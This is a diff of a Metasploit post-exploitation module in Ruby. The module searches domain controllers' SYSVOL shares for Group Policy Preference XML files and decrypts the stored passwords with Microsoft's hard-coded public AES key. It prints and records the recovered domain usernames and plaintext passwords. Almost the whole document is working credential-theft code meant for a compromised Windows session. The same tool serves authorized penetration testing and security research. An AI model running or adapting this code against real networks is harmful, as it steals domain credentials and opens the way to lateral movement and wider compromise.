@@ -5,37 +5,43 @@
 #   http://metasploit.com/
 ##
 
-
 require 'msf/core'
 require 'rex'
 require 'rexml/document'
-
 
 class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::Priv
 
-
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Windows Gather Group Policy Preferences Saved Password Extraction',
+			'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
 			'Description'   => %q{
-				This module enumerates Domain Controllers for any domains the
-				victim machine knows about. It then connects to those DCsvia SMB 
-				and looks for Group Policy Preferences XML files containing 
-				local user accounts and passwords. It then aprses the XML files
-				and decrypts the passwords.
+				This module enumerates the victim machine's domain controller and
+				connects to it via SMB. It then looks for Group Policy Preference XML
+				files containing local user accounts and passwords and decrypts them
+				using Microsofts public AES key.
 
-				This module must be run under a domain user to work. 
+				Tested directly on a Win2k8 x64 DC, Win2k12RC x64 DC, and a Windows 7 x32 Client
+				Workstation.
+
+				Using the ALL or DOMAINS flags whilst on a DC will not enumerate that DC as it
+				is looking externally on the network for other Domain Controllers, however the
+				default (CURRENT=True which inspects the registry) should work successfully.
 			},
 			'License'       => MSF_LICENSE,
-			'Author'        =>['
-				TheLightCosine <thelightcosine[at]gmail.com>',
-				'Rob Fuller <mubix[at]hak5.org>' #domain/dc enumeration code
+			'Author'        =>[
+				'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
+				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
+				'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
+				'TheLightCosine <thelightcosine[at]gmail.com>'
 				],
-			'References'    => 
+			'References'    =>
 				[
-					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences']
+					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
+					['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
+					['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
+					['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -49,113 +55,174 @@ class Metasploit3 < Msf::Post
 			return nil
 		end
 
+		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
+		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
+		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
+		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
+		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
+		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
+		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
+		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+
+		windir = client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL")
+
+
+		domains = []
 		dcs = []
-		paths = []
-		enum_domains.each do |domain|
-			if domain[:domain] == "WORKGROUP"
-				print_status "Skipping 'WORKGROUP'..."
-				next
-			end
-			dcs << enum_dcs(domain[:domain])
-		end
+		basepaths = []
+		fullpaths = []
 
-		dcs = dcs.flatten.compact
-		dcs.each do |dc|
-			print_status "Recusrively searching for Groups.xml on #{dc}..."
-			tmpath = "\\\\#{dc}\\sysvol\\" #msflab.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml"
-			paths << find_paths(tmpath)
-		end
+		basepaths << get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL"))
 
-		paths = paths.flatten.compact
-		paths.each do |path|
-			get_xml(path)
+		domains = enum_domains
+		domains.reject!{|n| n == "WORKGROUP"}
+		domains.each{ |domain| dcs << enum_dcs(domain)}
+		dcs.flatten!
+		dcs.compact!
+		dcs.each{ |dc| basepaths << get_basepaths("\\\\#{dc}\\SYSVOL") }
+
+		basepaths.flatten!
+		basepaths.compact!
+		basepaths.each do |policy_path|
+			fullpaths << find_path(policy_path, group_path)
+			fullpaths << find_path(policy_path, group_path_user)
+			fullpaths << find_path(policy_path, service_path)
+			fullpaths << find_path(policy_path, printer_path)
+			fullpaths << find_path(policy_path, drive_path)
+			fullpaths << find_path(policy_path, datasource_path)
+			fullpaths << find_path(policy_path, datasource_path_user)
+			fullpaths << find_path(policy_path, task_path)
+			fullpaths << find_path(policy_path, task_path_user)
+		end
+		fullpaths.flatten!
+		fullpaths.compact!
+		fullpaths.each do |filepath|
+			tmpfile = gpp_xml_file(filepath)
+			parse_xml(tmpfile) if tmpfile
 		end
 
 	end
 
-	def find_paths(path)
-		paths=[]
-		session.fs.dir.foreach(path) do |sub|
-			next if sub =~ /^(\.|\.\.)$/
-			print_status "Looking in Domain #{sub}"
-			tpath = "#{path}#{sub}\\Policies\\"
-			session.fs.dir.foreach(tpath) do |sub2|
-				next if sub2 =~ /^(\.|\.\.)$/
-				print_status "Looking in Policy #{sub2}"
-				tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
-				begin
-					paths << tpath2 if client.fs.file.stat(tpath2)
-					print_good tpath2
-				rescue 
-					next
+	def get_basepaths(base)
+		locals = []
+		begin
+			session.fs.dir.foreach(base) do |sub|
+				next if sub =~ /^(\.|\.\.)$/
+				tpath = "#{base}\\#{sub}\\Policies"
+				begin 
+					session.fs.dir.foreach(tpath) do |sub2|
+						next if sub =~ /^(\.|\.\.)$/
+						locals << "#{tpath}\\#{sub2}\\"
+					end
+				rescue
+					print_error "Could not access #{tpath}"
 				end
 			end
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Error accessing #{base} : #{e.message}"
 		end
-		return paths
+		return locals
 	end
 
 
-
-	def get_xml(path)
-		data=""
+	def find_path(path, xml_path)
+		xml_path = "#{path}\\#{xml_path}"
 		begin
-			xmlexists = client.fs.file.stat(path)
+			return xml_path if client.fs.file.stat(xml_path)
+		rescue Rex::Post::Meterpreter::RequestError => e
+			# No permissions for this specific file.
+			return nil
+		end
+	end
+
+	def gpp_xml_file(path)
+		begin
 			groups = client.fs.file.new(path,'r')
 			until groups.eof
-				data << groups.read
+				data = groups.read
 			end
-			domain = path.split('\\')[2]
-			parse_xml(data,domain)
-			print_status("Finished processing #{path}")
-		rescue
-			print_status("The file #{path} either could not be read or does not exist")
+
+			spath = path.split('\\')
+			retobj = {
+				:domain => spath[2],
+				:dc     => spath[0],
+				:xml    => REXML::Document.new(data).root
+			}	
+			return retobj
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Received error code #{e.code} when reading #{path}"
+			return nil
 		end
 	end
 
-	def parse_xml(data,domain)
-		mxml= REXML::Document.new(data).root
+	def parse_xml(xmlfile)
+		mxml = xmlfile[:xml]
 		mxml.elements.to_a("//Properties").each do |node|
-			user = node.attributes['userName']
-			epassword= node.attributes['cpassword']
-			next if epassword == nil or epassword== ""
-			padding = ( "=" * (4 - (epassword.length % 4)) )
-			epassword = "#{epassword}#{padding}"
-			decoded = epassword.unpack("m*")[0]
-			pass=decrypt(decoded)
-			print_good("DOMAIN: #{domain} USER: #{user} PASS: #{pass}")
-			user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
-			if session.db_record
-				source_id = session.db_record.id
-			else
-				source_id = nil
-			end
-			report_auth_info(
-				:host  => session,
-				:port => 445,
-				:sname => 'tcp',
-				:source_id => source_id,
-				:source_type => "exploit",
-				:user => user,
-				:pass => pass)
+			epassword = node.attributes['cpassword']
+			next if epassword.to_s.empty?
+			pass = decrypt(epassword)
+
+			user = node.attributes['runAs'] if node.attributes['runAs']
+			user = node.attributes['accountName'] if node.attributes['accountName']
+			user = node.attributes['username'] if  node.attributes['username']
+			user = node.attributes['userName'] if  node.attributes['userName']
+
+			print_good "DOMAIN CONTROLLER: #{xmlfile[:dc]} DOMAIN: #{xmlfile[:domain]} USER: #{user} PASS: #{pass} "
+			report_creds(user,pass)
 		end
+	end
+
+
+	def report_creds(user, pass)
+		if session.db_record
+			source_id = session.db_record.id
+		else
+			source_id = nil
+		end
+
+		report_auth_info(
+			:host  => session.sock.peerhost,
+			:port => 445,
+			:sname => 'smb',
+			:proto => 'tcp',
+			:source_id => source_id,
+			:source_type => "exploit",
+			:user => user,
+			:pass => pass)
 	end
 
 	def decrypt(encrypted_data)
+		padding = "=" * (4 - (encrypted_data.length % 4))
+		epassword = "#{encrypted_data}#{padding}"
+		decoded = Rex::Text.decode_base64(epassword)
+
 		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
 		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
 		aes.decrypt
 		aes.key = key
-		aes.update(encrypted_data) + aes.final
+		plaintext = aes.update(decoded)
+		plaintext << aes.final
+		pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
+
+		return pass
 	end
 
+
 	def enum_domains
-		print_status "Enumerating Domains..."
-		domain_enum = 2147483648 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
+		print_status "Enumerating Domains on the Network..."
+		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-		print_status("Finding the right buffersize...")
+		# Estimate new buffer size on percentage recovered.
+		percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
+		if percent_found > 0
+			buffersize = (buffersize/percent_found).to_i
+		else
+			buffersize += 500
+		end
+
 		while result['return'] == 234
-			print_status("Tested #{buffersize}, got #{result['entriesread']} of #{result['totalentries']}")
 			buffersize = buffersize + 500
 			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
 		end
@@ -166,17 +233,25 @@ class Metasploit3 < Msf::Post
 
 		base = 0
 		domains = []
+
+		if count == 0
+			return domains
+		end
+
 		mem = client.railgun.memread(startmem, 8*count)
-		count.times{|i|
+
+		count.times do |i|
 				x = {}
 				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
 				nameptr = mem[(base + 4),4].unpack("V*")[0]
 				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-				domains << x
+				domains << x[:domain]
 				base = base + 8
-			}
+		end
+
 		return domains
 	end
+
 
 	def enum_dcs(domain)
 		print_status("Enumerating DCs for #{domain}")
@@ -209,4 +284,8 @@ class Metasploit3 < Msf::Post
 		}
 		return hostnames
 	end
+
+
+
+
 end
